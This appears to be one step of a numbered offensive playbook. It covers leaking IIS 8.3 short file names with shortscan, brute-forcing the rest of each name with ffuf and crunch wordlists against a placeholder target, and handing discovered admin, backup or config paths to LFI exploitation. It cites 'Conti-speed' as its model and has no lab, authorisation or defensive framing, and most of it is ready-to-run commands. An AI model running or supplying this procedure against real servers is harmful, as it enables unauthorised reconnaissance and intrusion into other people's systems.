# Batch 07 — Short names → finish the name

## GOAL
Leak Windows 8.3 short names (`LIDSDI~1`), then fuzz **only the missing tail**.

## TIME
~1–2 hours

## YOU NEED
- Working IIS host  
- `shortscan` or IIS-ShortName-Scanner  
- `ffuf`  

---

## WHY (30 seconds)

Old Windows keeps short names like `VERYLO~1` for long folders.  
Buggy IIS can leak those short names even when full path 404s.  

You get: `LIDSDI~1`  
You do **not** know full name.  
So you keep prefix `lids` and fuzz the rest + extensions.  

That is smarter than brute-forcing the whole site from zero. Conti-speed: enum → complete → open.

---

## DO THIS

### 1) Enum short names

```bash
shortscan "https://TARGET/"
```

Example win lines:

```text
LIDSDI~1
EASYFI~1
ASPNET~1
```

### 2) Logical ffuf (prefix fixed)

```text
LIDSDI~1  →  https://TARGET/lidsFUZZ
EASYFI~1  →  https://TARGET/easyFUZZ
```

```bash
ffuf -w wordlist.txt -D -e asp,aspx,ashx,asmx -t 80 -c \
  -u "https://TARGET/lidsFUZZ"
```

### 3) Tiny leftover (optional)

```bash
crunch 0 3 abcdefghijklmnopqrstuvwxyz0123456789 -o 3chars.txt
ffuf -w 3chars.txt -e aspx,ashx,asp -u "https://TARGET/lidsdiFUZZ"
```

### 4) Write down

```text
Shortname vulnerable: yes/no
Full paths found:
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| admin/backup/config paths | Feed into **03** LFI / normal tests |
| Not vulnerable | Board done for this track |
| Hit mid-fuzz | Stop fuzz, exploit that path |

---

## NEXT
**Board complete** for shortnames.  
Loop to **03–06** if new paths open file/XML/vendor doors.
